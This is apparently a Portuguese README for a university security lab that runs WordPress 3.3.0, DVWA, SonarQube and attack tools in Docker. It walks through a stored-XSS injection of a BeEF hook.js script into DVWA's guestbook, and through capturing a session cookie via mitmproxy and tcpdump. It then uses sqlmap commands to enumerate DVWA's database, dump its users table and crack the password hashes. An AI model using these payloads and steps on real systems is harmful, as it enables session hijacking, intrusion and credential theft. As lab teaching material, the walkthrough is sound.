# 41ASO-SegInfo
Estudo sobre ataques de SQLi e XSS com PoC em sqlmap e BeeF. Turma `41ASO`, disciplina `ARCHITECTURE FOR MASTERING STRATEGIC AND EMERGING TECHNOLOGY INNOVATION`, professor `Ricardo Giorgi`.

## Pré-requisito
- [Docker](https://docs.docker.com/get-docker/)
- [Docker Compose](https://docs.docker.com/compose/install/)
- [Wireshark](https://www.wireshark.org/download.html)

## WordPress
Foi criado um container de WordPress na versão 3.3.0, obtido através da referência [WordPress Releases](https://wordpress.org/download/releases/).

Para construir a imagem do container de WordPress 3.3.0, é necessário realizar o comando `docker-compose build wordpress`.

Para executar o sistema WordPress, é necessário realizar os seguintes comandos:
```
docker-compose up -d db
docker-compose up -d wordpress
```
Enquanto o container de MariaDB não finalizar sua inicialização, o container do WordPress ficará restartando.

Realizamos o backup do diretório `/var/www/html/`, localizado em `wordpress/site/`, onde efetuamos a montagem desse diretório para o container, a fim de disponibilizar o ambiente preparado para o estudo.

Também realizamos o backup da base de dados `wordpress`, localizado em `wordpress\wordpress.sql`, onde efetuamos a montagem desse arquivo no container de MariaDB, para que seja carregado para o MariaDB durante sua primeira inicialização, trazendo todas as configurações realizadas no WordPress.

Exemplo de comando para realização do backup da base de dados:
```
mysqldump -u admin -padmin --quick --extended-insert wordpress > wordpress.sql
```

### Credenciais WordPress
- Home: `http://127.0.0.1:8889/`
- Página de login: `http://127.0.0.1:8889/wp-login.php`
- Usuário: `admin`
- Senha: `admin`

### Credenciais Base de Dados WordPress
- Host: `db`
- Usuário: `admin`
- Senha: `admin`
- Database: `wordpress`

## DVWA
Para auxiliar no estudo, configuramos um container de DVWA.

Para executar o container do sistema DVWA, é necessário realizar o seguinte comando:
```
docker-compose up -d dvwa
```

Para interagir com o sistema, acessar a URL `http://127.0.0.1:8888/`. Segue referência do [código-fonte](https://github.com/ethicalhack3r/DVWA).

### Credenciais DVWA
- Usuário: `admin`
- Senha: `password`

## SonarQube
Para auxiliar no estudo, configuramos um container de SonarQube, a fim de escanear códigos-fonte, na tentativa de identificação de vulnerabilidades.

Para executar o container do sistema DVWA, é necessário realizar o seguinte comando:
```
docker-compose up -d sonarqube
```
Pode demorar alguns minutos para terminar de inicializar o sistema.

Para interagir com o sistema, acessar a URL `http://127.0.0.1:9000/`.

### Credenciais SonarQube
- Usuário: `admin`
- Senha: `admin`

## SonarQube Scan
Container responsável por escanear os códigos-fonte dos sistemas alvo, e reportar ao SonarQube.

Para construir a imagem do container de scan, é necessário realizar o comando `docker-compose build sonar-scan`.

Garantir que o container do SonarQube está funcionando. Logar no site do container para validar, conforme instruções descritas acima.

Para realizar o scan dos sistemas DVWA e WordPress 3.3.0, realizar o seguinte comando:
```
docker-compose run sonar-scan
```

Para entrar no container de scan, realizar o seguinte comando:
```
docker-compose run sonar-scan bash
```

## Attack
Container contendo ferramentas para ataque dos sistemas alvo.

Para construir a imagem do container de ataque, é necessário realizar o comando `docker-compose build attack`. A construção da imagem é demorada, devido à instalação do framework BeEF.

Para entrar no container de ataque, realizar o seguinte comando:
```
docker-compose run attack bash
```

Para executar a framework BeEF, é necessário realizar os seguintes comandos:
```
docker-compose run attack bash
cd /opt/beef
./beef
```

Adicionalmente, pode-se executar outro `bash` no mesmo container. Para isso, primeiramente obter o nome do container em execução:
```
docker-compose ps
```
Resultando na seguinte saída de exemplo:
```
                Name                               Command               State           Ports
-------------------------------------------------------------------------------------------------------
41aso-seginfo_attack_run_c58f5649e3a3   bash                             Up
```
Agora basta executar o comando `docker exec -it 41aso-seginfo_attack_run_c58f5649e3a3 bash`.

### Credenciais BeEF
- Usuário: `beef`
- Senha: `feeb`

## Realizar ataque com BeEF
Primeiramente, precisaremos conectar na SDN Docker. Para isso, utilizaremos o mitmproxy. Executar o seguinte comando:
```
docker-compose up -d mitmproxy
```

Configurar o proxy da sua máquina ou navegador, para apontar para o IP do host Docker, na porta 8080.
Exemplo em Windows, com Docker Desktop:
```
Painel de Controle\Rede e Internet\Central de Rede e Compartilhamento -> Opções da Internet -> Aba "Conexões" -> Configurações da LAN -> Servidor proxy:
Endereço: 127.0.0.1
Porta: 8080
OK
```

Executar o BeEF e o DVWA. Após executar o BeEF, ele irá te indicar a URL `Hook URL`, com o IP da SDN Docker, onde deveremos copiar essa URL, para compor o código de injeção XSS. Exemplo de URL: `http://10.60.80.100:3000/hook.js`. Exemplo de código de injeção XSS: 
```html
<script src="http://10.60.80.100:3000/hook.js"></script>
```

Acessar o DVWA na URL [http://dvwa/login.php](http://dvwa/login.php) e efetuar o login. Selecionar o item `XSS (Stored)` do menu lateral. Essa página é responsável por listar mensagens enviadas pelos usuários, onde é possível preencher seu nome e a mensagem que deseja enviar. É uma página vulnerável ao ataque do tipo XSS, onde seguiremos os seguintes passos para executar o ataque:
- No campo de texto do `Message`, clicar com botão direito e inspecionar o elemento HTML. Deve aparecer o seguinte código:
```html
<textarea name="mtxMessage" cols="50" rows="3" maxlength="50"></textarea>
```
Aumentar o maxlength para que possamos injetar todo o código necessário:
```html
<textarea name="mtxMessage" cols="50" rows="3" maxlength="500"></textarea>
```
- No campo `Name`, preencher com qualquer informação: `HelloBeEF`.
- No campo `Message`, preencher com o código de injeção gerado:
```html
<script src="http://10.60.80.100:3000/hook.js"></script>
````
- Pressionar o botão `Sign Guestbook`

Toda vez que essa página for acessada, como ela lista as mensagens enviadas, e na última mensagem enviada, contém um código XSS injetado, automaticamente seremos redirecionados à página do BeEF.

## Realizar ataque com sqlmap
Para realizar um ataque SQLi com o sqlmap, antes precisamos capturar uma URL alvo, para explorarmos a vulnerabilidade SQLi. Nosso sistema alvo será o DVWA. Assumiremos uma das seguintes premissas:
- Através de engenharia social, forçamos o usuário a configurar o proxy de sua máquina ou navegador, apontando para o mitmproxy;
- Através de um ataque MITM, forçamos a máquina alvo acreditar que nosso mitmproxy é o seu default gateway, fazendo com que todas as conexões passem pelo mitmproxy. Nesse caso, o sistema alvo está rodando em HTTP, sem TLS. Caso possuísse TLS, teríamos que burlar também o HSTS, caso habilitado para o sistema alvo.

Executar o DVWA, mitmproxy e entrar no container attack. Obter o nome do container mitmproxy, executando o comando `docker-compose ps`. Entrar no container do mitmproxy, através de seu `sh`:
```
docker exec -it 41aso-seginfo_mitmproxy_1 sh
```

Instalar o `tcpdump`, para capturarmos o tráfego interceptado:
```
apk add tcpdump
```

Iniciar a capturar do tráfego, utilizando o seguinte comando:
```
tcpdump -i eth0 -w /dvwa.pcap host 10.60.80.2 and tcp port 80
```

Configurar o proxy da sua máquina ou navegador, para apontar para o IP do host Docker, na porta 8080 (mitmproxy), simulando uma das premissas apresentadas acima.

Simular o usuário usando o sistema DVWA, indo diretamente à página que chama o endpoint com vulnerabilidade SQLi:
- Efetuar o login em [http://dvwa/login.php](http://dvwa/login.php);
- Selecionar o item `SQL Injection (Blind)` do menu lateral;
- Preencher o campo `User ID` com o valor `1` e pressionar o botão `Submit`, simulando uma inserção de User ID no sistema. A requisição irá falhar, mas não tem problema, pois estamos interessados em capturar possíveis endpoints para exploração de vulnerabilidades do tipo SQLi.

Parar a captura de tráfego no shell rodando tcpdump, pressionando `Ctrl+C`. Foi gerado o arquivo `/dvwa.pcap`, que iremos extrair do container:
```
docker cp 41aso-seginfo_mitmproxy_1:/dvwa.pcap .
```

Abrir o arquivo PCAP, utilizando a ferramenta gráfica Wireshark. Pode-se importar o PCAP para a ferramenta Fiddler, caso prefira. Após abrir o PCAP no Wireshark, aplicar o filtro `http contains "/vulnerabilities"`. Com o filtro aplicado, podemos observar que existem requisições `GET`, passando query string contendo um parâmetro `id` seguido de um `Submit`. Ao clicar com botão direito do mouse nesse pacote, ir em `Follow` > `HTTP Stream`, apresentando o tráfego HTTP em formato ASCII, facilitando a visualização da comunicação dessa requisição. Procurar por `GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit HTTP/1.1`. Ao achar, procure pelo campo `Cookie` no cabeçalho HTTP. Copie o valor do campo Cookie. Exemplo: `PHPSESSID=lrl1q1ojh280pjr59r1hhmjiv1; security=low`

Entrar no container attack:
```
docker-compose run attack bash
```

Vamos analisar se esse endpoint que observamos, possuí vulnerabilidade SQLi. Para isso, executar o comando sqlmap, passando a URL alvo, o parâmetro que iremos testar e o cookie capturado, para indicar ao sistema que possuímos uma sessão válida:
```
sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=lrl1q1ojh280pjr59r1hhmjiv1; security=low" -p id
```
Rapidamente o sqlmap irá identificar que o banco de dados é da tecnologia MySQL. Ignore a análise para outros bancos e aceite ele rodar outros testes para MySQL. Pode ignorar o fuzzy test. Aceitar o teste com random integer. Ele irá indicar que o parâmetro `id` é vulnerável. Pode ignorar outros testes.

Agora que identificamos que o parâmetro `id` é vulnerável, vamos listar as bases de dados disponíveis no banco MySQL:
```
sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=lrl1q1ojh280pjr59r1hhmjiv1; security=low" -p id --dbs
```

Listou duas bases de dados, porém a que nos chama atenção é a base de dados chamada `dvwa`. Vamos analisar quais tabelas existem nessa base de dados:
```
sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=lrl1q1ojh280pjr59r1hhmjiv1; security=low" -p id -D dvwa --tables
```

Foram listadas as tabelas `guestbook` e `users`. Vamos listar as colunas existentes na tablea `users`:
```
sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=lrl1q1ojh280pjr59r1hhmjiv1; security=low" -p id -D dvwa -T users --columns
```

Nessa tabela, observamos que existem as colunas username e password. Vamos analisar quais tipos de dados são armazenados nesses campos:
```
sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=lrl1q1ojh280pjr59r1hhmjiv1; security=low" -p id -D dvwa -T users -C user,password --dump
```

Podemos observar que na coluna `password`, a senha é armazenada num padrão de hash MD5. O próprio `sqlmap` detecta o padrão de hash das senhas, e sugere utilizarmos ferramentas complementares para identificarmos quais senhas geram os hashs encontrados. Vamos aceitar a sugestão. O sqlmap nos perguntará se desejamos crackear as senhas utilizando um ataque dictionary-based. Vamos confirmar. Selecionar a opção `1`, para utilizarmos o dicionário padrão. Vamos ignorar o uso de sufixos.

Após alguns minutos, obtemos a lista de usuários e suas respectivas senhas do sistema DVWA. 
